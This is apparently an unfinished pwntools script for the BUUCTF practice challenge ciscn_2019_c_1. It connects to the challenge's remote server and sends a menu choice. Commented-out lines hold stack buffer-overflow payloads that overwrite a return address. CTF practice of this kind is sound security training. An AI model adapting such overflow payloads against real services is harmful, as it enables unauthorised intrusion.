from pwn import *

path="/mnt/e/S/CTF/BUUCTF/PWN/ciscn_2019_c_1"

#payload=b'a'*(128+8)+p64(0x00400596)
#payload = b'I'*20+b'a'*4+p32(0x08048F0D)
#sh=process(path)
sh=remote('node4.buuoj.cn',29654)

#sh.recvuntil(b">")
sh.sendline(b'2')
#sh.sendline(payload)

sh.interactive()